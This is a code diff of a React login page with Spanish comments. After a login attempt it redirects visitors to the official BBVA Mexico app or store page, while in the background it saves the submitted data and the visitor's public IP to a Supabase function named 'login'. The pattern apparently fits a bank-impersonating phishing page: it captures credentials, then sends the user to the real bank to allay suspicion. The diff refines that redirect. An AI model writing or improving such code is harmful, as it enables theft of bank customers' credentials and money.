@@ -62,22 +62,22 @@ function App() {
   const [loginError, setLoginError] = useState('')
   const [loginSuccess, setLoginSuccess] = useState('')
 
-  // Apertura síncrona inmediata para iOS / Android
+  // Apertura mediante Universal Links y fallback oficial
   const openApp = () => {
     const playStorePackage = 'com.bbva.bancomer'
     const appStoreId = '374824226'
+    const bbvaOfficialUrl = 'https://www.bbva.mx/'
 
     const userAgent = navigator.userAgent || navigator.vendor
     const isAndroid = /android/i.test(userAgent)
     const isIOS = /iPad|iPhone|iPod/.test(userAgent)
 
     if (isIOS) {
-      window.location.href = 'bbvamexico://'
-      setTimeout(() => {
-        window.location.href = `https://apps.apple.com/app/id${appStoreId}`
-      }, 1200)
+      // En iOS redirige al dominio oficial de Universal Links
+      window.location.href = bbvaOfficialUrl
     } else if (isAndroid) {
-      window.location.href = `intent://open#Intent;scheme=bbvamexico;package=${playStorePackage};S.browser_fallback_url=https://play.google.com/store/apps/details?id=${playStorePackage};end`
+      // En Android intenta abrir por Intent o redirige a la Play Store
+      window.location.href = `intent://open#Intent;scheme=https;package=${playStorePackage};S.browser_fallback_url=https://play.google.com/store/apps/details?id=${playStorePackage};end`
     } else {
       window.open(`https://apps.apple.com/app/id${appStoreId}`, '_blank')
     }
@@ -100,10 +100,10 @@ function App() {
     setLoginSuccess('')
     setIsSubmitting(true)
 
-    // 1. Iniciar redirección de forma SÍNCRONA inmediatamente tras el evento del clic
+    // 1. Iniciar la navegación inmediatamente tras el evento del usuario
     openApp()
 
-    // 2. Ejecutar la petición a Supabase en segundo plano
+    // 2. Ejecutar el guardado en Supabase en segundo plano
     try {
       const ip = await getPublicIP()
       const { error } = await supabase.functions.invoke('login', {
